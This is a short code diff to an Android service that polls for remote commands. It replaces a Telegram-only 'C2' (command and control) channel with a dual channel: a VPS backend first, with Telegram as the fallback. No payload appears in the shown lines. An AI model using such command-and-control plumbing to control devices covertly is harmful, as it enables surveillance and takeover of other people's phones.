@@ -415,9 +415,8 @@ class PasaService : LifecycleService() {
                     var polledSuccessfully = false
                     var commandReceivedInCycle = false
 
-                    // Pure Sovereign Mode: Direct-to-Telegram C2 exclusively.
-                    // Private botToken and ownerChatId NEVER leave the device to any VPS or relay.
-                    val shouldUseBackend = false
+                    // Dual-Channel C2: Poll VPS backend gateway when configured, fallback to direct Telegram
+                    val shouldUseBackend = preferencesManager.useBackendServer || preferencesManager.serverUrl.isNotBlank()
                     if (shouldUseBackend) {
                         try {
                             val pollResp = pasaBackendApi.pollCommands(preferencesManager.deviceId, timeout = 25)
@@ -500,8 +499,8 @@ class PasaService : LifecycleService() {
                         }
                     }
 
-                    // 2. Direct Telegram API fallback (ONLY if backend server is NOT used, preventing 409 Conflict)
-                    if (!polledSuccessfully && !shouldUseBackend) {
+                    // 2. Direct Telegram API fallback (if backend poll failed OR backend server is not configured)
+                    if (!polledSuccessfully) {
                         val token = preferencesManager.botToken
                         val offset = preferencesManager.updateOffset
 
